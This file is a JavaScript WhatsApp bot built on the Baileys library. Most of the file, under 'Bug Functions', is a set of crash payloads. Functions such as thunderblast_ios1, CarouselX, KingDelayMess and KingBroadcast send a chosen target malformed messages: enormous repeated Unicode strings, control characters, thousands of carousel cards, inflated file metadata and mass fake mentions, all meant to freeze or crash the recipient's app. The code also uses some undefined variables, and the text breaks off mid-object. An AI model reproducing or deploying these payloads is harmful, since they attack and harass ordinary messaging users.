/*
Richie is him t.me/hmmletts
*/
require('../setting/config')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReriyuectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediariyuInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisriyuectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

// ===================== Module =====================
const { 
    spawn: 
    spawn, 
    exec 
} = require('child_process')
const fs = require('fs')
const pino = require('pino')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const NodeCache = require("node-cache");
const axios = require('axios')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed()
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { ocrSpace } = require("ocr-space-api-wrapper")
const sharp = require("sharp")
module.exports = rich = async (rich, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);

// ===================== Database ===========================
const owner = JSON.parse(fs.readFileSync('./function/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./function/premium.json'))
const bankDataPath = './bankData.json';
const { protocolbug1, protocolbug2, protocolbug3, protocolbug8, protocolbug6, bulldozer, protocolbug7 } = require('./delay')
// Load bank data on startup
global.bankList = fs.existsSync(bankDataPath)
  ? JSON.parse(fs.readFileSync(bankDataPath))
  : {};

// Save function
function saveBankList() {
  fs.writeFileSync(bankDataPath, JSON.stringify(global.bankList, null, 2));
}
// ===================== Body dan Prefix =====================
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) 
    ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : "" 
  : global.prefa ?? global.prefix

// ===================== Command Handling ==================
const isCmd = budy.startsWith(prefix)
const command = isCmd ? budy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = budy.trim().split(/ +/).slice(1)
const qtext = q = args.join(" ")
const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
// ===================== User Info ===========================
const botNumber = await rich.decodeJid(rich.user.id)
const isCreator = [botNumber, ...owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isPremium = [botNumber, ...Premium]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

// ===================== Quoted Message =====================
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m

// ===================== Utility Functions =====================
const { 
    smsg,
    tanggal, 
    getTime, 
    isUrl, 
    sleep, 
    clockString, 
    runtime, 
    fetchJson, 
    getBuffer, 
    jsonformat, 
    format, 
    parseMention, 
    getRandom, 
    getGroupAdmins, 
    generateProfilePicture 
} = require('../function/storage')
const sendPollMenu = async (rich, jid) => {
  await rich.sendMessage(jid, {
    text: '📊 *Poll Menu*\n\nChoose one:',
    buttons: [
      { buttonId: 'poll_me', buttonText: { displayText: '🧠 Me' }, type: 1 },
      { buttonId: 'poll_button', buttonText: { displayText: '🔘 Button' }, type: 1 },
      { buttonId: 'poll_from', buttonText: { displayText: '📍 From' }, type: 1 },
    ],
    footer: 'Vote by tapping a button',
    headerType: 1
  });
};
// ===================== Group Info ==========================
const from = m.key.remoteJid
const sender = m.isGroup 
  ? (m.key.participant ? m.key.participant : m.participant) 
  : m.key.remoteJid

const groupMetadata = m.isGroup ? await rich.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : ""

// ===================== User Info Tambahan ==================
const pushname = m.pushName || "No Name"

// ===================== Waktu & Lokalisasi ==================
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
})

// ===================== MIME ==============================
const mime = (quoted.msg || quoted).mimetype || ''

// ===================== Exif & Media Converter ===============
const { 
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    addExif 
} = require('../function/exif.js')

// ===================== Media Assets ========================
const imgCrL = fs.readFileSync("./start/media/CrL.jpg")
const image1 = fs.readFileSync("./start/media/image1.jpg")
const richieplay = fs.readFileSync("./start/media/rich.mp3")
// ===================== Access Control =====================
if (!rich.public) {
  if (!isCreator) return
}
   
// ===================== Console Logger =====================
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}

// auto follow 

// ===================== Bug Functions =====================


async function carousels2(target, fJids) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: imgCrL },
    { upload: rich.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
    gifPlayback: false,
    subtitle: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞͞⃟⏤͟͟͞͞͠🩸✦',
    hasMediaAttachment: true
  });

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: {
        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com"
            })
          }
        ]
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
            },
            footer: {
              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );
  
  await rich.relayMessage(
    target,
    msg.message,
    fJids
      ? { participant: { jid: target, messageId: null } }
      : {}
  );
  console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
}

async function Loc(target, amount, jids) {
let pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
locationMessage: {},
hasMediaAttachment: true
},
body: {
text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}
]
}
}
},
carouselMessage: {
cards: []
}
}
}), {
userJid: target,
quoted: null
});

await rich.relayMessage(isTarget, pesan.message, jids ? {
participant: { jid: isTarget }
} : {});
console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
}
async function thunderblast_ios1(target) {
    const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🚀","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await rich.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await rich.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await rich.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: TravaIphone,
            url: "https://youtube.com/@ShinZ.00"
        }
    }, { participant: { jid: target } });

await rich.relayMessage(target, {
        'extendedTextMessage': {
            'text': TravaIphone,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'UNDEFINEDONTOP↕️' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "SAMSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await rich.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await rich.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://youtube.com/@ShinZ.00"
        }
    }, { participant: { jid: target } });
    
    await rich.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://youtube.com/@qioaje"
        }
    }, { participant: { jid: target } });
}
async function callHome(target, ptcp = true) {
let conf = {}
if (ptcp === true) {
    conf = {
        "participant": {
            "jid": target
        }
    }
}
rich.relayMessage(target, {
"viewOnceMessage": {
"message": {
"interactiveMessage": {
    "header": {
        "hasMediaAttachment": false
    },
    "body": {
        "text": "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
    },
    "nativeFlowMessage": {
        "buttons": [
            {
                "name": "cta_call",
                "buttonParamsJson": JSON.stringify({
                    "status": "𛀠"
                })
            },
// it crashes because status is not EXPIRED ore CALL_COMPLETED
            {
                "name": "call_permission_request",
                "buttonParamsJson": ""
            }
        ],
        "messageParamsJson": ""
    }
}
}
}
},conf)
}
async function CarouselX(target) {
for (let i = 0; i < 1020; i++) {
try {
        let push = [];

        // Generate 1000 cards
        for (let i = 0; i < 1020; i++) {
            push.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        fileLength: "10840",
                        height: 10,
                        width: 10,
                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1721344123",
                        jpegThumbnail: ""
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
            });
        }
        
        const carousel = generateWAMessageFromContent(
            targetJID, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@richieMods" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, 
            {}
        );

        await rich.relayMessage(targetJID, carousel.message, {
            participant: { jid: targetJID },
        });

    } catch (err) {
        console.error("Error in Fkod:", err);
    }
}
}

async function KingDelayMess(target, Ptcp = true) {
  await rich.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
              fileLength: 9999999999999,
              pageCount: 1316134911,
              mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
              fileName: "kingbadboi.𝐜𝐨𝐦",
              fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦\n" + "@15056662003".repeat(1000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Iqbhalkeifer",
                  url: "https://youtube.com/@iqbhalkeifer25",
                  merchant_url: "https://youtube.com/@iqbhalkeifer25"
                })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "{}"
              }
            ],
            messageParamsJson: "{}"
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from({ length: 50 }, () => `${Math.floor(Math.random() * 9000000000) + 1000000000}@s.whatsapp.net`)
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=", "base64"),
                fileName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
                fileEncSha256: Buffer.from("wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=", "base64"),
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1724474503,
                contactVcard: true
              }
            }
          }
        })
      }
    }
  }, Ptcp ? { participant: target } : {});
}
async function KingBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "richie is him"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await rich.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await rich.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function DelayInvisNew(target) {
  const payload = {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "Qw"
    },
    message: {
      extendedTextMessage: {
        text: "\u2060", 
        matchedText: "\u2060",
        canonicalUrl: "https://t.me/DevRaizel",
        title: "𝐑𝐀𝐈𝐙𝐄𝐋",
        description: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
        jpegThumbnail: "https://files.catbox.moe/aanan8.jpg",
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            mediaType: 1,
            previewType: "DOCUMENT",
            title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
            thumbnailUrl: "https://files.catbox.moe/aanan8.jpg",
            sourceUrl: "https://t.me/DevRaizel"
          },
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
